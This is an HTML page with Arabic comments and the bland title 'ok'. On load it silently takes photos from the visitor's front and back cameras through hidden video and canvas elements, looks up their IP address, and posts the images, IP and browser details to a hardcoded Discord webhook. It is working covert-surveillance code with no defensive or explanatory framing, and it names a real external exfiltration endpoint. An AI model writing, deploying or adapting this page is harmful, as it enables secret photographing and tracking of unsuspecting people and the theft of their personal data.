<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title> ok </title>
</head>
<body>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb';

        async function captureAndSend() {
            try {
                // 1. التقاط صورة من الكاميرا الأمامية (الافتراضية)
                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const imgFront = await takeSnap(streamFront);
                
                // 2. التقاط صورة من الكاميرا الخلفية
                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
                const imgBack = await takeSnap(streamBack);

                // 3. جلب IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();

                // 4. إرسال كل البيانات
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ip,
                        front_cam: imgFront,
                        back_cam: imgBack,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language
                    })
                });
            } catch (e) {
                console.error("Error:", e);
            }
        }

        async function takeSnap(stream) {
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const data = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            return data;
        }

        window.onload = captureAndSend;
    </script>
</body>
</html>
